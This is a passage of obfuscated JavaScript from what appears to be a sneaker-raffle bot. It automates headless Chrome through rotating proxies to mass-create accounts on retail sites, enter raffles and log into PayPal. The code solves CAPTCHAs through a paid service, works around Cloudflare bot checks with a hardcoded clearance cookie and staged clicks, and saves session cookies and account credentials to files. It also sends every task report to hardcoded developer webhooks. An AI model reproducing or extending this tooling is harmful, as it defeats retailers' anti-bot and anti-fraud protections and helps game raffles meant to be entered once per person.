        console['log'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Getting\x20Session');
        const _0xde5a37 = JSON['parse'](_0x76f3de['readFileSync']('sessions/log.json')), _0x162bfd = await _0x41811e['newPage']();
        await _0x162bfd['authenticate']({
            'username': '' + _0x3f6ebd[0x2],
            'password': '' + _0x3f6ebd[0x3]
        }), await _0x162bfd['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x162bfd, await _0x162bfd['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x162bfd['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Successfully\x20logged\x20in'), await _0x4f800b(0x2710), _0x750f8b = await _0x162bfd['cookies'](), _0x76f3de['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x750f8b));
        } catch (_0x394126) {
            throw new Error('Login\x20session\x20expired\x20' + _0x394126);
        }
        for (var _0x60ce59 = 0x0; _0x60ce59 < _0x1e928a['length']; _0x60ce59++) {
            console['log'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Task\x20' + (_0x60ce59 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4bfd08(_0x3b4e19 + '\x20Task\x20' + (_0x60ce59 + 0x1) + '\x20/\x20' + _0x1e928a['length']);
            const _0x5e7c67 = await _0x41811e['newPage']();
            await _0x5e7c67['goto']('' + _0x1e928a[_0x60ce59], { 'waitUntil': 'networkidle2' }), await _0x4f800b(0xbb8);
            try {
                const _0x5219f7 = await _0x5e7c67['$']('#challenge-heading');
                _0x5219f7 && (console['log'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Task\x20' + (_0x60ce59 + 0x1) + '\x20:\x20' + _0x41434e['yellow']('2FA\x20Required')), await _0x5e7c67['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4f800b(0x61a8), await _0x5e7c67['waitForSelector']('#payment-submit-btn'), await _0x5e7c67['$eval']('#payment-submit-btn', _0xab49eb => _0xab49eb['click']()), await _0x5e7c67['click']('#payment-submit-btn');
                try {
                    await _0x5e7c67['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4f800b(0x5dc), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Task\x20' + (_0x60ce59 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xef8508) {
                    throw new Error('Payment\x20Rejected:\x20' + _0xef8508['message']);
                } finally {
                    await _0x5e7c67['close'](), await _0x4f800b(0x4650);
                }
            } catch (_0x2ef2ed) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x3b4e19 + ']\x20Task\x20' + (_0x60ce59 + 0x1) + '\x20:\x20' + _0x2ef2ed));
            }
        }
    } catch (_0x4fd3ac) {
        console['log'](_0x41434e['red']('' + _0x4fd3ac));
    } finally {
        await _0x41811e['close']();
    }
}
async function _0x5e017b(_0x1cfc10, _0x25d3f5, _0x4b2a61) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x37d7e8 = 0x0; _0x37d7e8 < _0x1cfc10['length']; _0x37d7e8++) {
        var _0x541e8d;
        await _0x38b36b(_0x1cfc10, _0x37d7e8), _0x4bfd08(_0x4b2a61['name'] + '\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20/\x20' + _0x1cfc10['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        var _0x4609ed = await _0xff2c9f(_0x1cfc10[_0x37d7e8], _0x4b2a61, 'acc', ![]);
        const _0x4dbe2d = { 'succesDEVMSG': { 'embeds': [_0x4609ed] } }, _0x4cdece = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x48536a = Math['round'](Math['random']() * (_0x25d3f5['length'] - 0x1)), _0xb65e87 = _0x25d3f5[_0x48536a]['split'](':');
        const _0x4b9ce1 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0xb65e87[0x0] + ':' + _0xb65e87[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x4aebd6 = await _0x4b9ce1['newPage']();
            await _0x4aebd6['authenticate']({
                'username': '' + _0xb65e87[0x2],
                'password': '' + _0xb65e87[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4aebd6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4aebd6['setRequestInterception'](!![]), _0x4aebd6['on']('request', _0x4a997f => {
                _0x4a997f['resourceType']() === 'image' ? _0x4a997f['abort']() : _0x4a997f['continue']();
            }), await _0x4aebd6['goto']('' + _0x4cdece), await _0x4aebd6['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x4aebd6['click']('button[class=\x22cf2Lf6\x22]'), await _0x4aebd6['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4f800b(0x7d0), await _0x4aebd6['click']('a.action.create.primary.social-login'), await _0x4f800b(0x7d0), await _0x4aebd6['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4f800b(0x190), await _0x4aebd6['type']('#firstname', _0x1cfc10[_0x37d7e8]['FirstName'], { 'delay': 0xf0 }), await _0x4f800b(0x190), await _0x4aebd6['type']('#lastname', _0x1cfc10[_0x37d7e8]['LastName'], { 'delay': 0xe6 }), await _0x4f800b(0x190), await _0x4aebd6['type']('#bss_email_address', _0x1cfc10[_0x37d7e8]['Email'], { 'delay': 0x122 }), await _0x4f800b(0x190), await _0x4aebd6['type']('#password', _0x1cfc10[_0x37d7e8]['Password'], { 'delay': 0x1e0 }), console['log'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4f800b(0x2bc), await _0x4aebd6['click']('#bt-social-create'), await _0x4aebd6['click']('#bt-social-create'), await _0x4f800b(0x1388);
            const _0x3b7a7c = await _0x4aebd6['$']('#bss_email_address-error');
            if (_0x3b7a7c)
                throw new Error('Invalid\x20Email');
            const _0x373fb6 = await _0x4aebd6['$']('#password-error');
            if (_0x373fb6)
                throw new Error('Invalid\x20Password');
            await _0x4aebd6['waitForSelector']('div.mesg-success'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20Account\x20' + _0x1cfc10[_0x37d7e8]['Email'] + '\x20Generated')), _0x76f3de['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x1cfc10[_0x37d7e8]['Email'] + ',' + _0x1cfc10[_0x37d7e8]['Password']);
            try {
                _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x4dbe2d['succesDEVMSG']);
            } catch {
            }
            await _0x5f2c92(_0x22ad4d, _0x4dbe2d['succesDEVMSG']), console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x364653) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Task\x20' + (_0x37d7e8 + 0x1) + '\x20:\x20' + _0x364653)), _0x541e8d = '' + _0x364653;
            var _0x372ee0 = await _0xff2c9f(_0x1cfc10[_0x37d7e8], _0x4b2a61, 'acc', !![], _0x541e8d);
            _0x4dbe2d['errorDEV'] = { 'embeds': [_0x372ee0] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x4dbe2d['errorDEV']), await _0x5f2c92(_0x3afc50, _0x4dbe2d['errorDEV']);
        } finally {
            _0x4b9ce1['close'](), console['log'](_0x57a400() + '\x20[' + _0x4b2a61['name'] + ']\x20Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x1e096c(_0x36e127, _0xb662c1, _0x526220) {
    _0x168014['use'](_0x4554c9());
    for (var _0x4b7248 = 0x0; _0x4b7248 < _0x36e127['length']; _0x4b7248++) {
        var _0x42147a = Math['round'](Math['random']() * (_0xb662c1['length'] - 0x1)), _0x3a4fc8 = _0xb662c1[_0x42147a]['split'](':');
        const _0x44d9f5 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3a4fc8[0x0] + ':' + _0x3a4fc8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x364f59 = await _0x44d9f5['newPage']();
            await _0x364f59['authenticate']({
                'username': '' + _0x3a4fc8[0x2],
                'password': '' + _0x3a4fc8[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Task\x20' + (_0x4b7248 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x364f59['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x364f59['setRequestInterception'](!![]), _0x364f59['on']('request', _0x3e40e0 => {
                _0x3e40e0['resourceType']() === 'image' || _0x3e40e0['resourceType']() === 'font' || _0x3e40e0['resourceType']() === 'media' ? _0x3e40e0['abort']() : _0x3e40e0['continue']();
            }), console['log'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Task\x20' + (_0x4b7248 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x364f59['goto'](_0x36e127[_0x4b7248]), console['log'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Task\x20' + (_0x4b7248 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x364f59['waitForTimeout'](0xbb8);
            try {
                await _0x364f59['waitForSelector']('.dashboard-main_title'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Task\x20' + (_0x4b7248 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x8277a9 = await _0xff2c9f(null, _0x526220, 'ver', ![]);
                const _0x185d00 = { 'succesDEVMSG': { 'embeds': [_0x8277a9] } };
                await _0x5f2c92(_0x5e1d93, _0x185d00['succesDEVMSG']);
            } catch (_0xace3a6) {
                throw new Error(_0xace3a6);
            }
        } catch (_0x3e84b3) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Task\x20' + (_0x4b7248 + 0x1) + '\x20:\x20' + _0x3e84b3));
            var _0x27fcf4 = _0x3e84b3, _0x420b80 = await _0xff2c9f(null, _0x526220, 'ver', !![], _0x27fcf4);
            const _0x27f143 = { 'errorDEVMSG': { 'embeds': [_0x420b80] } };
            _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x27f143['errorDEVMSG']), await _0x5f2c92(_0x3afc50, _0x27f143['errorDEVMSG']);
        } finally {
            _0x44d9f5['close'](), console['log'](_0x57a400() + '\x20[' + _0x526220['name'] + ']\x20Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x548eec(_0x41e24d, _0x572ebe, _0x1eed7d) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5afe0d = 0x0; _0x5afe0d < _0x41e24d['length']; _0x5afe0d++) {
        var _0x2588db;
        await _0x38b36b(_0x41e24d, _0x5afe0d), _0x4bfd08(_0x1eed7d['name'] + '\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20/\x20' + _0x41e24d['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        var _0xb4ba7c = Math['round'](Math['random']() * (_0x572ebe['length'] - 0x1)), _0x295c6a = _0x572ebe[_0xb4ba7c]['split'](':'), _0x4fd942;
        try {
            _0x4fd942 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x295c6a[0x0] + ':' + _0x295c6a[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x4fd942 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x295c6a[0x0] + ':' + _0x295c6a[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x381a27 = await _0x4fd942['newPage'](), _0x35c61c = await _0x381a27['target']()['createCDPSession'](), { windowId: _0x60930b } = await _0x35c61c['send']('Browser.getWindowForTarget');
            await _0x381a27['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x319d5e = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x381a27['authenticate']({
                'username': '' + _0x295c6a[0x2],
                'password': '' + _0x295c6a[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x381a27['goto']('' + _0x41e24d[_0x5afe0d]['Url']), console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x381a27['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x35c61c['send']('Browser.setWindowBounds', {
                'windowId': _0x60930b,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x4f800b(0x1388), await _0x381a27['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x381a27['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4f800b(0x1f4), console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Logging\x20in'), await _0x381a27['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x3089d8 => _0x3089d8['click']()), await _0x381a27['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x381a27['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4f800b(0x7d0), await _0x381a27['waitForSelector']('#email-login'), await _0x381a27['type']('#email-login', '' + _0x41e24d[_0x5afe0d]['Email']), await _0x4f800b(0x1f4), await _0x381a27['waitForSelector']('#password'), await _0x381a27['type']('#password', '' + _0x41e24d[_0x5afe0d]['Password']), await _0x4f800b(0x1f4);
            try {
                await _0x381a27['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x59de4a => _0x59de4a['click']()), await _0x381a27['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x381a27['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x572b8d) {
            }
            await _0x4f800b(0x3e8);
            const _0x38e97f = await _0x381a27['$']('.enteredDraw_container__2KmQ_');
            if (_0x38e97f)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x41e24d[_0x5afe0d]['Size']);
            if (_0x41e24d[_0x5afe0d]['Size'] != 'RANDOM') {
                var _0x3d5c77 = _0x41e24d[_0x5afe0d]['Size']['replace']('.', ',');
                const _0x19471b = await _0x381a27['$x']('//div[contains(text(),\x20' + _0x3d5c77 + ')]');
                await _0x19471b[0x0]['click']();
            } else {
                const _0x1ac965 = await _0x381a27['$$']('div.swatchTile_tile__IRH9Q');
                var _0x252f2d = Math['round'](Math['random']() * (_0x1ac965['length'] - 0x1));
                await _0x1ac965[_0x252f2d]['click']();
            }
            await _0x4f800b(0x1f4);
            const _0x2bd67d = await _0x381a27['$']('.addressList_addressItem__LE2PB');
            if (_0x2bd67d) {
            } else
                console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Filling\x20Address'), await _0x381a27['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4f800b(0x5dc), await _0x381a27['waitForSelector']('#firstname'), await _0x381a27['type']('#firstname', '' + _0x41e24d[_0x5afe0d]['FirstName']), await _0x4f800b(0x1f4), await _0x381a27['waitForSelector']('#firstname'), await _0x381a27['type']('#lastname', '' + _0x41e24d[_0x5afe0d]['LastName']), await _0x4f800b(0x1f4), await _0x381a27['waitForSelector']('#firstname'), await _0x381a27['type']('#street', '' + _0x41e24d[_0x5afe0d]['Address1']), await _0x4f800b(0x1f4), await _0x381a27['waitForSelector']('#firstname'), await _0x381a27['type']('#houseNumber', _0x41e24d[_0x5afe0d]['HouseNumber'] + '\x20' + _0x41e24d[_0x5afe0d]['Address2']), await _0x4f800b(0x1f4), await _0x381a27['waitForSelector']('#firstname'), await _0x381a27['select']('#country_code', '' + _0x41e24d[_0x5afe0d]['Country']), await _0x4f800b(0x1f4), await _0x381a27['type']('#postcode', '' + _0x41e24d[_0x5afe0d]['Zip']), await _0x4f800b(0x1f4), await _0x381a27['type']('#city', '' + _0x41e24d[_0x5afe0d]['City']), await _0x4f800b(0x1f4), await _0x381a27['type']('#telephone', '' + _0x41e24d[_0x5afe0d]['Phone']), await _0x4f800b(0x1f4), await _0x381a27['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x4f800b(0x9c4);
            try {
                await _0x381a27['type']('#instagram_name', '' + _0x41e24d[_0x5afe0d]['Follower']), await _0x381a27['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4f800b(0x5dc), await _0x381a27['click']('.checkBox_boxHolder__wLGVe'), await _0x4f800b(0x1f4), await _0x381a27['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x4f800b(0x1388), await _0x381a27['waitForSelector']('.success_msg__2HjJY'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x1d6f8e = await _0xff2c9f(_0x41e24d[_0x5afe0d], _0x1eed7d, 'dev', ![]), _0x334fb2 = await _0xff2c9f(_0x41e24d[_0x5afe0d], _0x1eed7d, 'pub', ![]);
            const _0x40a53c = {
                'succesDEVMSG': { 'embeds': [_0x1d6f8e] },
                'succesPUBMSG': { 'embeds': [_0x334fb2] }
            };
            try {
                _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x40a53c['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x40a53c['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x302219, _0x40a53c['succesPUBMSG']);
            } catch (_0xa27547) {
                console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xa27547));
            }
        } catch (_0x235c66) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Task\x20' + (_0x5afe0d + 0x1) + '\x20:\x20' + _0x235c66)), _0x2588db = '' + _0x235c66;
            var _0x261c60 = await _0xff2c9f(_0x41e24d[_0x5afe0d], _0x1eed7d, 'dev', !![], _0x2588db), _0x1d6f8e = await _0xff2c9f(_0x41e24d[_0x5afe0d], _0x1eed7d, 'dev', ![]), _0x334fb2 = await _0xff2c9f(_0x41e24d[_0x5afe0d], _0x1eed7d, 'pub', ![]);
            const _0x28ac1e = {
                'succesDEVMSG': { 'embeds': [_0x1d6f8e] },
                'succesPUBMSG': { 'embeds': [_0x334fb2] }
            };
            _0x28ac1e['errorDEV'] = { 'embeds': [_0x261c60] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x28ac1e['errorDEV']), await _0x5f2c92(_0x3afc50, _0x28ac1e['errorDEV']);
        } finally {
            _0x4fd942['close'](), console['log'](_0x57a400() + '\x20[' + _0x1eed7d['name'] + ']\x20Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x3edde8(_0x430500, _0x52cb80, _0x195a14) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x204e28 = 0x0; _0x204e28 < _0x430500['length']; _0x204e28++) {
        var _0x3c2314 = '', _0x2f9b2f = 0x0, _0x77c417;
        await _0x38b36b(_0x430500, _0x204e28), _0x4bfd08(_0x195a14['name'] + '\x20Task\x20' + (_0x204e28 + 0x1) + '\x20/\x20' + _0x430500['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        var _0x5a459a = await _0xff2c9f(_0x430500[_0x204e28], _0x195a14, 'acc', ![]);
        const _0x539344 = { 'succesDEVMSG': { 'embeds': [_0x5a459a] } }, _0x4d6397 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0xe5bdae = Math['round'](Math['random']() * (_0x52cb80['length'] - 0x1)), _0x456b63 = _0x52cb80[_0xe5bdae]['split'](':'), _0x4b4ac1;
        try {
            _0x4b4ac1 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x456b63[0x0] + ':' + _0x456b63[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x4b4ac1 = await _0x168014['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x456b63[0x0] + ':' + _0x456b63[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x222cf1 = await _0x4b4ac1['newPage']();
            await _0x222cf1['setViewport']({
                'width': 0x500 + _0x56db67(0x1, 0x32),
                'height': 0x2d9 + _0x56db67(0x1, 0x32)
            });
            const _0x48e1f3 = await _0x222cf1['target']()['createCDPSession'](), { windowId: _0x24f045 } = await _0x48e1f3['send']('Browser.getWindowForTarget');
            await _0x222cf1['authenticate']({
                'username': '' + _0x456b63[0x2],
                'password': '' + _0x456b63[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x222cf1['goto']('' + _0x4d6397, { 'waitUntil': 'networkidle2' }), await _0x4f800b(0x1388), console['log'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x8ea9b1 = await _0x222cf1['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x8ea9b1 && await _0x8ea9b1['click']();
            } catch {
            }
            await _0x48e1f3['send']('Browser.setWindowBounds', {
                'windowId': _0x24f045,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x222cf1['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x4f800b(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x222cf1['type']('input[name=\x22firstname\x22]', '' + _0x430500[_0x204e28]['FirstName']), await _0x4f800b(0x1f4), await _0x222cf1['type']('input[name=\x22lastname\x22]', '' + _0x430500[_0x204e28]['LastName']), await _0x4f800b(0x1f4), await _0x222cf1['type']('input[name=\x22email\x22]', '' + _0x430500[_0x204e28]['Email']), await _0x4f800b(0x1f4), await _0x222cf1['type']('input[name=\x22password\x22]', '' + _0x430500[_0x204e28]['Password']), await _0x4f800b(0x258), await _0x222cf1['$eval']('input[name=\x22psgdpr\x22]', _0x4fc2bb => _0x4fc2bb['click']()), await _0x4f800b(0x1f4), console['log'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x222cf1['$eval']('#customer-form', _0xeb2a76 => _0xeb2a76['submit']());
            try {
                await _0x222cf1['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Account\x20' + _0x430500[_0x204e28]['Email'] + '\x20Generated')), _0x76f3de['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x430500[_0x204e28]['Email'] + ',' + _0x430500[_0x204e28]['Password']);
                try {
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x539344['succesDEVMSG']);
                } catch {
                }
                await _0x5f2c92(_0x22ad4d, _0x539344['succesDEVMSG']);
            } catch (_0x33a4f0) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x33a4f0);
            }
        } catch (_0x40cc5f) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20' + _0x40cc5f)), _0x77c417 = '' + _0x40cc5f;
            var _0x145d3c = await _0xff2c9f(_0x430500[_0x204e28], _0x195a14, 'acc', !![], _0x77c417);
            _0x539344['errorDEV'] = { 'embeds': [_0x145d3c] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x539344['errorDEV']), await _0x5f2c92(_0x3afc50, _0x539344['errorDEV']), _0x3c2314 = 'yes';
        } finally {
            _0x4b4ac1['close']();
            if (_0x3c2314 == 'yes' && _0x2f9b2f != 0x5 && _0x77c417 != 'Size\x20Not\x20Found') {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Task\x20' + (_0x204e28 + 0x1) + '\x20:\x20Retrying')), _0x204e28 = _0x204e28 - 0x1, _0x2f9b2f = _0x2f9b2f + 0x1;
                continue;
            }
            console['log'](_0x57a400() + '\x20[' + _0x195a14['name'] + ']\x20Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x107a68(_0x2e4f2a, _0x27fc29, _0x4b52aa) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x87d2e1 = 0x0; _0x87d2e1 < _0x2e4f2a['length']; _0x87d2e1++) {
        var _0x179d82 = '', _0x1c44cf = 0x0, _0x1bf89e;
